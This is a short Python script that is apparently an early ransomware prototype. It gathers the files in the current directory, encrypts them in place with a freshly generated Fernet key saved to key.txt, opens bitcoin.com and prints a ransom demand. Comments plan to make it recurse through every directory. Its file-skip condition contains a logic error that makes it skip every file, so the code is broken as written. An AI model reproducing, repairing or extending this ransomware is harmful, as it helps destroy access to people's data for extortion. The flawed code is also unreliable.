import os
from cryptography.fernet import Fernet
import webbrowser

files = []

# TODO: make this happen for every file in every directory?
## add an if checking if it is a directory, if so, recursion
## make this into a function instead so we can do so

for file in os.listdir():
    # avoid acciently locking out current progress
    if file == "decrypt.py" or file == "encrypt.py" or file == "key.txt" or "README.md":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
print(key)

# writing the key to a file for now
with open("key.txt", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as _file:
        contents = _file.read()

    enc_content = Fernet(key).encrypt(contents)
    with open(file, "wb") as _file:
        _file.write(enc_content)


# TODO: make this a function
webbrowser.open("www.bitcoin.com")
print("give me 1mil bitcoin OR ELSE!")
